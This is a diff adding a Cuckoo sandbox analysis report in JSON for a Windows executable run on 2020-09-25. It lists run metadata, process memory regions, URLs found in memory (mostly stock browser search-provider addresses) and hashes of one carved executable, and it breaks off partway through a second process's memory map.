@@ -1,0 +1,4649 @@
+{
+    "info": {
+        "added": 1601042089.750054, 
+        "started": 1601043464.100542, 
+        "duration": 673, 
+        "ended": 1601044137.391774, 
+        "owner": null, 
+        "score": 4.2, 
+        "id": 1, 
+        "category": "file", 
+        "git": {
+            "head": "13cbe0d9e457be3673304533043e992ead1ea9b2", 
+            "fetch_head": "13cbe0d9e457be3673304533043e992ead1ea9b2"
+        }, 
+        "monitor": "2deb9ccd75d5a7a3fe05b2625b03a8639d6ee36b", 
+        "package": "exe", 
+        "route": "none", 
+        "custom": null, 
+        "machine": {
+            "status": "stopped", 
+            "name": "cuckoo1", 
+            "label": "win7", 
+            "manager": "KVM", 
+            "started_on": "2020-09-25 14:17:44", 
+            "shutdown_on": "2020-09-25 14:28:57"
+        }, 
+        "platform": "windows", 
+        "version": "2.0.7", 
+        "options": "procmemdump=yes,route=none"
+    }, 
+    "procmemory": [
+        {
+            "regions": [
+                {
+                    "protect": "rw", 
+                    "end": "0x00020000", 
+                    "addr": "0x00010000", 
+                    "state": 4096, 
+                    "offset": 24, 
+                    "type": 262144, 
+                    "size": 65536
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x00030000", 
+                    "addr": "0x00020000", 
+                    "state": 4096, 
+                    "offset": 65584, 
+                    "type": 262144, 
+                    "size": 65536
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x00031000", 
+                    "addr": "0x00030000", 
+                    "state": 4096, 
+                    "offset": 131144, 
+                    "type": 131072, 
+                    "size": 4096
+                }, 
+                {
+                    "protect": "r", 
+                    "end": "0x00041000", 
+                    "addr": "0x00040000", 
+                    "state": 4096, 
+                    "offset": 135264, 
+                    "type": 16777216, 
+                    "size": 4096
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x00090000", 
+                    "addr": "0x00089000", 
+                    "state": 4096, 
+                    "offset": 139384, 
+                    "type": 131072, 
+                    "size": 28672
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x00190000", 
+                    "addr": "0x0018d000", 
+                    "state": 4096, 
+                    "offset": 168080, 
+                    "type": 131072, 
+                    "size": 12288
+                }, 
+                {
+                    "protect": "r", 
+                    "end": "0x00194000", 
+                    "addr": "0x00190000", 
+                    "state": 4096, 
+                    "offset": 180392, 
+                    "type": 262144, 
+                    "size": 16384
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x001a1000", 
+                    "addr": "0x001a0000", 
+                    "state": 4096, 
+                    "offset": 196800, 
+                    "type": 131072, 
+                    "size": 4096
+                }, 
+                {
+                    "protect": "rwx", 
+                    "end": "0x001b1000", 
+                    "addr": "0x001b0000", 
+                    "state": 4096, 
+                    "offset": 200920, 
+                    "type": 131072, 
+                    "size": 4096
+                }, 
+                {
+                    "protect": "rwx", 
+                    "end": "0x001c1000", 
+                    "addr": "0x001c0000", 
+                    "state": 4096, 
+                    "offset": 205040, 
+                    "type": 131072, 
+                    "size": 4096
+                }, 
+                {
+                    "protect": "rwx", 
+                    "end": "0x001d1000", 
+                    "addr": "0x001d0000", 
+                    "state": 4096, 
+                    "offset": 209160, 
+                    "type": 131072, 
+                    "size": 4096
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x001e1000", 
+                    "addr": "0x001e0000", 
+                    "state": 4096, 
+                    "offset": 213280, 
+                    "type": 131072, 
+                    "size": 4096
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x00207000", 
+                    "addr": "0x001f0000", 
+                    "state": 4096, 
+                    "offset": 217400, 
+                    "type": 131072, 
+                    "size": 94208
+                }, 
+                {
+                    "protect": "rx", 
+                    "end": "0x00271000", 
+                    "addr": "0x00270000", 
+                    "state": 4096, 
+                    "offset": 311632, 
+                    "type": 131072, 
+                    "size": 4096
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x002d6000", 
+                    "addr": "0x00280000", 
+                    "state": 4096, 
+                    "offset": 315752, 
+                    "type": 131072, 
+                    "size": 352256
+                }, 
+                {
+                    "protect": "r", 
+                    "end": "0x003e7000", 
+                    "addr": "0x00380000", 
+                    "state": 4096, 
+                    "offset": 668032, 
+                    "type": 262144, 
+                    "size": 421888
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x003f1000", 
+                    "addr": "0x003f0000", 
+                    "state": 4096, 
+                    "offset": 1089944, 
+                    "type": 131072, 
+                    "size": 4096
+                }, 
+                {
+                    "protect": "r", 
+                    "end": "0x00401000", 
+                    "addr": "0x00400000", 
+                    "state": 4096, 
+                    "offset": 1094064, 
+                    "type": 16777216, 
+                    "size": 4096
+                }, 
+                {
+                    "protect": "rwxc", 
+                    "end": "0x00412000", 
+                    "addr": "0x00401000", 
+                    "state": 4096, 
+                    "offset": 1098184, 
+                    "type": 16777216, 
+                    "size": 69632
+                }, 
+                {
+                    "protect": "rwc", 
+                    "end": "0x00415000", 
+                    "addr": "0x00412000", 
+                    "state": 4096, 
+                    "offset": 1167840, 
+                    "type": 16777216, 
+                    "size": 12288
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x00418000", 
+                    "addr": "0x00415000", 
+                    "state": 4096, 
+                    "offset": 1180152, 
+                    "type": 16777216, 
+                    "size": 12288
+                }, 
+                {
+                    "protect": "r", 
+                    "end": "0x0041b000", 
+                    "addr": "0x00418000", 
+                    "state": 4096, 
+                    "offset": 1192464, 
+                    "type": 16777216, 
+                    "size": 12288
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x00421000", 
+                    "addr": "0x00420000", 
+                    "state": 4096, 
+                    "offset": 1204776, 
+                    "type": 131072, 
+                    "size": 4096
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x00431000", 
+                    "addr": "0x00430000", 
+                    "state": 4096, 
+                    "offset": 1208896, 
+                    "type": 131072, 
+                    "size": 4096
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x00441000", 
+                    "addr": "0x00440000", 
+                    "state": 4096, 
+                    "offset": 1213016, 
+                    "type": 131072, 
+                    "size": 4096
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x00454000", 
+                    "addr": "0x00450000", 
+                    "state": 4096, 
+                    "offset": 1217136, 
+                    "type": 131072, 
+                    "size": 16384
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x00464000", 
+                    "addr": "0x00460000", 
+                    "state": 4096, 
+                    "offset": 1233544, 
+                    "type": 131072, 
+                    "size": 16384
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x00476000", 
+                    "addr": "0x00470000", 
+                    "state": 4096, 
+                    "offset": 1249952, 
+                    "type": 131072, 
+                    "size": 24576
+                }, 
+                {
+                    "protect": "r", 
+                    "end": "0x00483000", 
+                    "addr": "0x00480000", 
+                    "state": 4096, 
+                    "offset": 1274552, 
+                    "type": 262144, 
+                    "size": 12288
+                }, 
+                {
+                    "protect": "r", 
+                    "end": "0x00603000", 
+                    "addr": "0x00600000", 
+                    "state": 4096, 
+                    "offset": 1286864, 
+                    "type": 262144, 
+                    "size": 12288
+                }, 
+                {
+                    "protect": "r", 
+                    "end": "0x00791000", 
+                    "addr": "0x00610000", 
+                    "state": 4096, 
+                    "offset": 1299176, 
+                    "type": 262144, 
+                    "size": 1576960
+                }, 
+                {
+                    "protect": "r", 
+                    "end": "0x007cd000", 
+                    "addr": "0x007a0000", 
+                    "state": 4096, 
+                    "offset": 2876160, 
+                    "type": 262144, 
+                    "size": 184320
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x01bb0000", 
+                    "addr": "0x01ba0000", 
+                    "state": 4096, 
+                    "offset": 3060504, 
+                    "type": 131072, 
+                    "size": 65536
+                }, 
+                {
+                    "protect": "rwx", 
+                    "end": "0x01bb8000", 
+                    "addr": "0x01bb0000", 
+                    "state": 4096, 
+                    "offset": 3126064, 
+                    "type": 131072, 
+                    "size": 32768
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x01bc1000", 
+                    "addr": "0x01bc0000", 
+                    "state": 4096, 
+                    "offset": 3158856, 
+                    "type": 131072, 
+                    "size": 4096
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x01bd1000", 
+                    "addr": "0x01bd0000", 
+                    "state": 4096, 
+                    "offset": 3162976, 
+                    "type": 131072, 
+                    "size": 4096
+                }, 
+                {
+                    "protect": "rwx", 
+                    "end": "0x01be8000", 
+                    "addr": "0x01be0000", 
+                    "state": 4096, 
+                    "offset": 3167096, 
+                    "type": 131072, 
+                    "size": 32768
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x01bf1000", 
+                    "addr": "0x01bf0000", 
+                    "state": 4096, 
+                    "offset": 3199888, 
+                    "type": 131072, 
+                    "size": 4096
+                }, 
+                {
+                    "protect": "rwx", 
+                    "end": "0x01c08000", 
+                    "addr": "0x01c00000", 
+                    "state": 4096, 
+                    "offset": 3204008, 
+                    "type": 131072, 
+                    "size": 32768
+                }, 
+                {
+                    "protect": "r", 
+                    "end": "0x01c16000", 
+                    "addr": "0x01c10000", 
+                    "state": 4096, 
+                    "offset": 3236800, 
+                    "type": 262144, 
+                    "size": 24576
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x01c21000", 
+                    "addr": "0x01c20000", 
+                    "state": 4096, 
+                    "offset": 3261400, 
+                    "type": 262144, 
+                    "size": 4096
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x01c45000", 
+                    "addr": "0x01c40000", 
+                    "state": 4096, 
+                    "offset": 3265520, 
+                    "type": 131072, 
+                    "size": 20480
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x01c81000", 
+                    "addr": "0x01c80000", 
+                    "state": 4096, 
+                    "offset": 3286024, 
+                    "type": 131072, 
+                    "size": 4096
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x01d10000", 
+                    "addr": "0x01d00000", 
+                    "state": 4096, 
+                    "offset": 3290144, 
+                    "type": 131072, 
+                    "size": 65536
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x01d20000", 
+                    "addr": "0x01d10000", 
+                    "state": 4096, 
+                    "offset": 3355704, 
+                    "type": 131072, 
+                    "size": 65536
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x01d38000", 
+                    "addr": "0x01d20000", 
+                    "state": 4096, 
+                    "offset": 3421264, 
+                    "type": 131072, 
+                    "size": 98304
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x01d79000", 
+                    "addr": "0x01d60000", 
+                    "state": 4096, 
+                    "offset": 3519592, 
+                    "type": 131072, 
+                    "size": 102400
+                }, 
+                {
+                    "protect": "r", 
+                    "end": "0x01e7f000", 
+                    "addr": "0x01da0000", 
+                    "state": 4096, 
+                    "offset": 3622016, 
+                    "type": 262144, 
+                    "size": 913408
+                }, 
+                {
+                    "protect": "r", 
+                    "end": "0x02273000", 
+                    "addr": "0x01e80000", 
+                    "state": 4096, 
+                    "offset": 4535448, 
+                    "type": 262144, 
+                    "size": 4141056
+                }, 
+                {
+                    "protect": "r", 
+                    "end": "0x0254f000", 
+                    "addr": "0x02280000", 
+                    "state": 4096, 
+                    "offset": 8676528, 
+                    "type": 262144, 
+                    "size": 2945024
+                }, 
+                {
+                    "protect": "r", 
+                    "end": "0x02e80000", 
+                    "addr": "0x02550000", 
+                    "state": 4096, 
+                    "offset": 11621576, 
+                    "type": 262144, 
+                    "size": 9633792
+                }
+            ], 
+            "yara": [], 
+            "num": 1, 
+            "file": "/home/debian/.cuckoo/storage/analyses/1/memory/2044-1.dmp", 
+            "urls": [
+                "http://www.expedia.com/favicon.ico", 
+                "http://uk.ask.com/favicon.ico", 
+                "http://www.priceminister.com/", 
+                "http://www.iask.com/favicon.ico", 
+                "http://www.merlin.com.pl/favicon.ico", 
+                "http://www.cnet.com/favicon.ico", 
+                "http://search.nifty.com/", 
+                "http://ns.adobe.com/exif/1.0/", 
+                "http://www.etmall.com.tw/", 
+                "http://search.goo.ne.jp/", 
+                "http://fr.wikipedia.org/favicon.ico", 
+                "http://busca.estadao.com.br/favicon.ico", 
+                "http://search.hanafos.com/favicon.ico", 
+                "http://search.chol.com/favicon.ico", 
+                "http://amazon.fr/", 
+                "http://www.amazon.co.jp/", 
+                "http://www.mtv.com/favicon.ico", 
+                "http://busqueda.aol.com.mx/", 
+                "http://search.live.com/results.aspx?FORM=SOLTDF", 
+                "http://msdn.microsoft.com/", 
+                "http://msdn.microsoft.com/workshop/security/privacy/overview/privacyimportxml.asp)", 
+                "http://www.sify.com/favicon.ico", 
+                "http://yellowpages.superpages.com/", 
+                "http://suche.freenet.de/", 
+                "http://search.aol.com/", 
+                "http://browse.guardian.co.uk/", 
+                "http://www.mercadolibre.com.mx/", 
+                "http://www.asharqalawsat.com/", 
+                "http://www.facebook.com/", 
+                "http://si.wikipedia.org/favicon.ico", 
+                "http://www.rtl.de/favicon.ico", 
+                "http://search.msn.com/results.aspx?q=", 
+                "http://www.microsoft.com.", 
+                "http://search.naver.com/favicon.ico", 
+                "http://en.wikipedia.org/favicon.ico", 
+                "http://si.wikipedia.org/w/api.php?action=opensearch", 
+                "http://udn.com/favicon.ico", 
+                "http://rover.ebay.com", 
+                "http://search.ebay.fr/", 
+                "http://www.univision.com/", 
+                "http://pt.wikipedia.org/w/api.php?action=opensearch", 
+                "http://it.wikipedia.org/favicon.ico", 
+                "http://uk.ask.com/", 
+                "http://www.google.co.uk/", 
+                "http://cnweb.search.live.com/results.aspx?q=", 
+                "http://www.google.cz/", 
+                "http://www.google.co.jp/", 
+                "http://search.ebay.co.uk/", 
+                "http://www.weather.com/", 
+                "http://www.taobao.com/favicon.ico", 
+                "http://www.news.com.au/favicon.ico", 
+                "http://search.orange.co.uk/favicon.ico", 
+                "http://video.globo.com/", 
+                "http://search.ebay.de/", 
+                "http://www.taobao.com/", 
+                "http://corp.naukri.com/favicon.ico", 
+                "http://www.servicios.clarin.com/", 
+                "http://localhost", 
+                "http://www.rambler.ru/favicon.ico", 
+                "http://www.linternaute.com/favicon.ico", 
+                "http://ns.adobe.com/photoshop/1.0/", 
+                "http://www.shopzilla.com/", 
+                "http://www.amazon.com/gp/search?ie=UTF8", 
+                "http://search.live.com/results.aspx?FORM=SO2TDF", 
+                "http://busca.orange.es/", 
+                "http://www.excite.co.jp/", 
+                "http://cs.wikipedia.org/", 
+                "http://www.gismeteo.ru/favicon.ico", 
+                "http://www.cjmall.com/favicon.ico", 
+                "http://suche.t-online.de/", 
+                "http://www.ya.com/favicon.ico", 
+                "http://www.priceminister.com/favicon.ico", 
+                "http://www.mercadolibre.com.mx/favicon.ico", 
+                "http://ns.adobe.com/tiff/1.0/", 
+                "http://www.otto.de/favicon.ico", 
+                "http://www.iask.com/", 
+                "http://www.arrakis.com/", 
+                "http://www.microsofttranslator.com/BVPrev.aspx?ref=IE8Activity", 
+                "http://search.hanafos.com/", 
+                "http://search.gamer.com.tw/", 
+                "http://www.tiscali.it/favicon.ico", 
+                "http://ns.adobe.com/xap/1.0/", 
+                "http://www.soso.com/favicon.ico", 
+                "http://recherche.tf1.fr/", 
+                "http://si.wikipedia.org/", 
+                "http://search.livedoor.com/", 
+                "http://search.centrum.cz/", 
+                "http://www.auction.co.kr/auction.ico", 
+                "http://www.t-online.de/favicon.ico", 
+                "http://ja.wikipedia.org/favicon.ico", 
+                "http://www.abril.com.br/favicon.ico", 
+                "http://clients5.google.com/complete/search?hl=", 
+                "http://www.ozon.ru/", 
+                "http://search.alice.it/", 
+                "http://www.microsoft.com/windowsxp/expertzone/", 
+                "http://search.yahoo.co.jp/favicon.ico", 
+                "http://cnet.search.com/", 
+                "http://www.walmart.com/", 
+                "http://espn.go.com/favicon.ico", 
+                "http://msdn.microsoft.com/workshop/security/szone/overview/templates.asp)", 
+                "http://search.interpark.com/", 
+                "http://www.gmarket.co.kr/favicon.ico", 
+                "http://www.neckermann.de/favicon.ico", 
+                "http://sitesearch.timesonline.co.uk/", 
+                "http://cn.bing.com/search?q=", 
+                "http://video.globo.com/favicon.ico", 
+                "http://es.wikipedia.org/", 
+                "http://img.atlas.cz/favicon.ico", 
+                "http://searchresults.news.com.au/", 
+                "http://search.rediff.com/", 
+                "http://search.lycos.co.uk/", 
+                "http://en.wikipedia.org/", 
+                "http://www.google.com.tw/", 
+                "http://www.tchibo.de/", 
+                "http://www.google.com/", 
+                "http://buscador.terra.es/", 
+                "http://search.msn.co.jp/results.aspx?q=", 
+                "http://www.mercadolivre.com.br/favicon.ico", 
+                "http://ja.wikipedia.org/", 
+                "http://search.chol.com/", 
+                "http://search.espn.go.com/", 
+                "http://www.google.com.sa/", 
+                "http://jobsearch.monster.com/", 
+                "http://buscador.terra.com/", 
+                "http://www.google.co.in/", 
+                "http://www.google.fr/", 
+                "http://www.cdiscount.com/favicon.ico", 
+                "http://asp.usatoday.com/", 
+                "http://vachercher.lycos.fr/", 
+                "http://www.yam.com/favicon.ico", 
+                "http://search.sify.com/", 
+                "http://search.ebay.com/favicon.ico", 
+                "http://www.paginasamarillas.es/", 
+                "http://nl.wikipedia.org/", 
+                "http://search.alice.it/favicon.ico", 
+                "http://www.ask.com/", 
+                "http://www.so-net.ne.jp/share/favicon.ico", 
+                "http://espanol.search.yahoo.com/", 
+                "http://www.alarabiya.net/favicon.ico", 
+                "http://ocnsearch.goo.ne.jp/", 
+                "http://list.taobao.com/", 
+                "http://buscador.terra.com.br/", 
+                "http://search.msn.co.uk/results.aspx?q=", 
+                "http://www.google.de/", 
+                "http://busca.igbusca.com.br//app/static/images/favicon.ico", 
+                "http://www.rambler.ru/", 
+                "http://purl.org/dc/elements/1.1/", 
+                "http://www.cdiscount.com/", 
+                "http://www.mercadolivre.com.br/", 
+                "http://www.facebook.com/favicon.ico", 
+                "http://search.ebay.es/", 
+                "http://sads.myspace.com/", 
+                "http://suche.web.de/", 
+                "http://recherche.tf1.fr/favicon.ico", 
+                "http://cs.wikipedia.org/w/api.php?action=opensearch", 
+                "http://search.dreamwiz.com/", 
+                "http://xml-us.amznxslt.com/onca/xml?Service=AWSECommerceService", 
+                "http://www.yandex.ru/", 
+                "http://www.baidu.com/favicon.ico", 
+                "http://ariadna.elmundo.es/", 
+                "http://www.rtl.de/", 
+                "http://es.search.yahoo.com/", 
+                "http://p.zhongsou.com/", 
+                "http://es.wikipedia.org/favicon.ico", 
+                "http://www.timesonline.co.uk/img/favicon.ico", 
+                "http://buscar.ozu.es/", 
+                "http://so-net.search.goo.ne.jp/", 
+                "http://cgi.search.biglobe.ne.jp/favicon.ico", 
+                "http://list.taobao.com/browse/search_visual.htm?n=15", 
+                "http://www.soso.com/", 
+                "http://www.afisha.ru/App_Themes/Default/images/favicon.ico", 
+                "http://img.shopzilla.com/shopzilla/shopzilla.ico", 
+                "http://wellformedweb.org/CommentAPI/", 
+                "http://search.orange.co.uk/", 
+                "http://ariadna.elmundo.es/favicon.ico", 
+                "http://it.wikipedia.org/", 
+                "http://www3.fnac.com/favicon.ico", 
+                "http://en.wikipedia.org/w/api.php?action=opensearch", 
+                "http://support.microsoft.com", 
+                "http://in.search.yahoo.com/", 
+                "http://www.etmall.com.tw/favicon.ico", 
+                "http://www.ceneo.pl/favicon.ico", 
+                "http://service2.bfast.com/", 
+                "http://tw.search.yahoo.com/", 
+                "http://es.ask.com/", 
+                "http://www.ozu.es/favicon.ico", 
+                "http://ru.wikipedia.org/", 
+                "http://google.pchome.com.tw/", 
+                "http://p.zhongsou.com/favicon.ico", 
+                "http://search.ebay.com/", 
+                "http://search1.taobao.com/", 
+                "http://br.search.yahoo.com/", 
+                "http://suche.lycos.de/", 
+                "http://www.asharqalawsat.com/favicon.ico", 
+                "http://mail.live.com/", 
+                "http://ru.search.yahoo.com", 
+                "http://de.wikipedia.org/", 
+                "http://find.joins.com/", 
+                "http://ns.adobe.com/xap/1.0/mm/", 
+                "http://www.google.ru/", 
+                "http://busca.uol.com.br/favicon.ico", 
+                "http://search.seznam.cz/", 
+                "http://de.wikipedia.org/w/api.php?action=opensearch", 
+                "http://www.expedia.com/", 
+                "http://www.clarin.com/favicon.ico", 
+                "http://busca.uol.com.br/", 
+                "http://mail.live.com/?rru=compose%3Fsubject%3D", 
+                "http://buscador.terra.com/favicon.ico", 
+                "http://search.nate.com/", 
+                "http://purl.org/rss/1.0/modules/slash/", 
+                "http://ie8.ebay.com/open-search/output-xml.php?q=", 
+                "http://www.kkbox.com.tw/favicon.ico", 
+                "http://www.ocn.ne.jp/favicon.ico", 
+                "http://corp.naukri.com/", 
+                "http://www.amazon.com/exec/obidos/external-search/104-2981279-3455918?index=blended", 
+                "http://www.microsofttranslator.com/BV.aspx?ref=IE8Activity", 
+                "http://www.recherche.aol.fr/", 
+                "http://pl.wikipedia.org/w/api.php?action=opensearch", 
+                "http://www.weather.com/favicon.ico", 
+                "http://search.centrum.cz/favicon.ico", 
+                "http://search.yam.com/", 
+                "http://search.live.com/results.aspx?q=", 
+                "http://search.empas.com/favicon.ico", 
+                "http://images.joins.com/ui_c/fvc_joins.ico", 
+                "http://cgi.search.biglobe.ne.jp/", 
+                "http://msk.afisha.ru/", 
+                "http://es.wikipedia.org/w/api.php?action=opensearch", 
+                "http://www.google.pl/", 
+                "http://www.arrakis.com/favicon.ico", 
+                "http://search.microsoft.com/", 
+                "http://search.goo.ne.jp/favicon.ico", 
+                "http://image.excite.co.jp/jp/favicon/lep.ico", 
+                "http://www.merlin.com.pl/", 
+                "http://www.amazon.de/", 
+                "http://www.sogou.com/", 
+                "http://cerca.lycos.it/", 
+                "http://www.orange.fr/", 
+                "http://spaces.live.com/BlogIt.aspx", 
+                "http://www.microsofttranslator.com/?ref=IE8Activity", 
+                "http://www.rakuten.co.jp/favicon.ico", 
+                "http://www.nate.com/favicon.ico", 
+                "http://de.wikipedia.org/favicon.ico", 
+                "http://ru.wikipedia.org/w/api.php?action=opensearch", 
+                "http://www.microsofttranslator.com/DefaultPrev.aspx?ref=IE8Activity", 
+                "http://search.daum.net/favicon.ico", 
+                "http://nl.wikipedia.org/favicon.ico", 
+                "http://it.search.yahoo.com/", 
+                "http://www.google.it/", 
+                "http://suche.web.de/favicon.ico", 
+                "http://www.paginasamarillas.es/favicon.ico", 
+                "http://search.seznam.cz/favicon.ico", 
+                "http://search.livedoor.com/favicon.ico", 
+                "http://search.lycos.com/", 
+                "http://fr.wikipedia.org/w/api.php?action=opensearch", 
+                "http://search.dreamwiz.com/favicon.ico", 
+                "http://www.kkbox.com.tw/", 
+                "http://suche.aol.de/", 
+                "http://it.search.dada.net/", 
+                "http://search.empas.com/", 
+                "http://yellowpages.superpages.com/favicon.ico", 
+                "http://arianna.libero.it/", 
+                "http://www.dailymail.co.uk/", 
+                "http://ru.wikipedia.org/favicon.ico", 
+                "http://search.auction.co.kr/", 
+                "http://search.lycos.com/favicon.ico", 
+                "http://www3.fnac.com/", 
+                "http://search.yahoo.co.jp", 
+                "http://asp.usatoday.com/favicon.ico", 
+                "http://search.msn.com.cn/results.aspx?q=", 
+                "http://cn.bing.com/favicon.ico", 
+                "http://search2.estadao.com.br/", 
+                "http://search.cn.yahoo.com/", 
+                "http://ie.search.yahoo.com/os?command=", 
+                "http://www.tesco.com/", 
+                "http://search-dyn.tiscali.it/", 
+                "http://search.ipop.co.kr/favicon.ico", 
+                "http://arianna.libero.it/favicon.ico", 
+                "http://www.myspace.com/favicon.ico", 
+                "http://search.gismeteo.ru/", 
+                "http://www.dailymail.co.uk/favicon.ico", 
+                "http://www.microsoft.com/schemas/rss/core/2005/internal", 
+                "http://home.altervista.org/", 
+                "http://it.search.dada.net/favicon.ico", 
+                "http://www.gmarket.co.kr/", 
+                "http://price.ru/favicon.ico", 
+                "http://www.google.com.br/", 
+                "http://buscar.ya.com/", 
+                "http://images.monster.com/favicon.ico", 
+                "http://search.ebay.it/", 
+                "http://www.alarabiya.net/", 
+                "http://www.najdi.si/", 
+                "http://www.maktoob.com/favicon.ico", 
+                "http://purl.org/rss/1.0/modules/content/", 
+                "http://ns.adobe.com/pdf/1.3/", 
+                "http://price.ru/", 
+                "http://www.najdi.si/favicon.ico", 
+                "http://kr.search.yahoo.com/", 
+                "http://www.aol.com/favicon.ico", 
+                "http://www.ozon.ru/favicon.ico", 
+                "http://pl.wikipedia.org/", 
+                "http://www.target.com/favicon.ico", 
+                "http://fr.search.yahoo.com/", 
+                "http://search.daum.net/", 
+                "http://de.search.yahoo.com/", 
+                "http://suche.freenet.de/favicon.ico", 
+                "http://busca.buscape.com.br/favicon.ico", 
+                "http://www.microsoft.com/favicon.ico", 
+                "http://auone.jp/favicon.ico", 
+                "http://buscador.lycos.es/", 
+                "http://search.yahoo.com/", 
+                "http://www.sogou.com/favicon.ico", 
+                "http://search.rediff.com/favicon.ico", 
+                "http://search.auone.jp/", 
+                "http://web.ask.com/", 
+                "http://search.books.com.tw/", 
+                "http://search.ebay.in/", 
+                "http://search.about.com/", 
+                "http://www.neckermann.de/", 
+                "http://browse.guardian.co.uk/favicon.ico", 
+                "http://www.tesco.com/favicon.ico", 
+                "http://ns.adobe.com/iX/1.0/", 
+                "https://www.example.com.", 
+                "http://www.target.com/", 
+                "http://www.amazon.com/favicon.ico", 
+                "http://recherche.linternaute.com/", 
+                "http://pt.wikipedia.org/favicon.ico", 
+                "http://openimage.interpark.com/interpark.ico", 
+                "http://www.google.si/", 
+                "http://www.yandex.ru/favicon.ico", 
+                "http://www.google.com/favicon.ico", 
+                "http://www.walmart.com/favicon.ico", 
+                "http://udn.com/", 
+                "http://esearch.rakuten.co.jp/", 
+                "http://www.google.es/", 
+                "http://www.cnet.co.uk/", 
+                "http://www.mtv.com/", 
+                "http://search.live.com/results.aspx?FORM=IEFM1", 
+                "http://www.abril.com.br/", 
+                "http://www.baidu.com/", 
+                "http://www.amazon.co.uk/", 
+                "http://it.wikipedia.org/w/api.php?action=opensearch", 
+                "http://www.tchibo.de/favicon.ico", 
+                "http://www.pchome.com.tw/favicon.ico", 
+                "http://pt.wikipedia.org/", 
+                "http://fr.wikipedia.org/", 
+                "http://ja.wikipedia.org/w/api.php?action=opensearch", 
+                "http://www.chennaionline.com/ncommon/images/collogo.ico", 
+                "http://www.cjmall.com/", 
+                "http://uk.search.yahoo.com/", 
+                "http://search.yahoo.com/favicon.ico", 
+                "http://busca.igbusca.com.br/", 
+                "https://localhost", 
+                "http://www.nifty.com/favicon.ico", 
+                "http://search.naver.com/", 
+                "http://home.altervista.org/favicon.ico", 
+                "http://search.gamer.com.tw/favicon.ico", 
+                "http://busca.buscape.com.br/", 
+                "http://search.atlas.cz/", 
+                "http://www.ceneo.pl/", 
+                "http://search.aol.co.uk/", 
+                "http://pl.wikipedia.org/favicon.ico", 
+                "http://search.ipop.co.kr/", 
+                "http://search.books.com.tw/favicon.ico", 
+                "http://search.aol.in/", 
+                "https://example.com", 
+                "http://cs.wikipedia.org/favicon.ico", 
+                "http://spaces.live.com/", 
+                "http://www.microsofttranslator.com/Default.aspx?ref=IE8Activity", 
+                "http://z.about.com/m/a08.ico", 
+                "http://www.univision.com/favicon.ico", 
+                "http://nl.wikipedia.org/w/api.php?action=opensearch"
+            ], 
+            "extracted": [
+                {
+                    "yara": [], 
+                    "sha1": "3f359520ee5728b89053f46412966c5ecf73d924", 
+                    "name": "2044-3f359520ee5728b8.exe_", 
+                    "type": "PE32 executable (console) Intel 80386, for MS Windows", 
+                    "sha256": "2fbccf0d425c23cf21d81587e9845212642fcf93a2c0e1604eaf1b78310d6823", 
+                    "urls": [], 
+                    "crc32": "565F380D", 
+                    "path": "/home/debian/.cuckoo/storage/analyses/1/memory/2044-3f359520ee5728b8.exe_", 
+                    "ssdeep": null, 
+                    "size": 110592, 
+                    "sha512": "cb0af53d78cbad444e73310881287fae4423b2d321f63de3c37ed999d8a76d578b065ce1d5f67a82c12605bfd51c23e01979a423f72e85cb48f7f1d65b9bfa19", 
+                    "md5": "dfb87741dbac051a7c55ced30f5d4a63"
+                }
+            ], 
+            "pid": 2044
+        }, 
+        {
+            "regions": [
+                {
+                    "protect": "rw", 
+                    "end": "0x00020000", 
+                    "addr": "0x00010000", 
+                    "state": 4096, 
+                    "offset": 24, 
+                    "type": 262144, 
+                    "size": 65536
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x00030000", 
+                    "addr": "0x00020000", 
+                    "state": 4096, 
+                    "offset": 65584, 
+                    "type": 262144, 
+                    "size": 65536
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x00031000", 
+                    "addr": "0x00030000", 
+                    "state": 4096, 
+                    "offset": 131144, 
+                    "type": 131072, 
+                    "size": 4096
+                }, 
+                {
+                    "protect": "r", 
+                    "end": "0x00041000", 
+                    "addr": "0x00040000", 
+                    "state": 4096, 
+                    "offset": 135264, 
+                    "type": 16777216, 
+                    "size": 4096
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x00090000", 
+                    "addr": "0x00089000", 
+                    "state": 4096, 
+                    "offset": 139384, 
+                    "type": 131072, 
+                    "size": 28672
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x00190000", 
+                    "addr": "0x0018d000", 
+                    "state": 4096, 
+                    "offset": 168080, 
+                    "type": 131072, 
+                    "size": 12288
+                }, 
+                {
+                    "protect": "r", 
+                    "end": "0x00194000", 
+                    "addr": "0x00190000", 
+                    "state": 4096, 
+                    "offset": 180392, 
+                    "type": 262144, 
+                    "size": 16384
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x001a1000", 
+                    "addr": "0x001a0000", 
+                    "state": 4096, 
+                    "offset": 196800, 
+                    "type": 131072, 
+                    "size": 4096
+                }, 
+                {
+                    "protect": "rwx", 
+                    "end": "0x001b1000", 
+                    "addr": "0x001b0000", 
+                    "state": 4096, 
+                    "offset": 200920, 
+                    "type": 131072, 
+                    "size": 4096
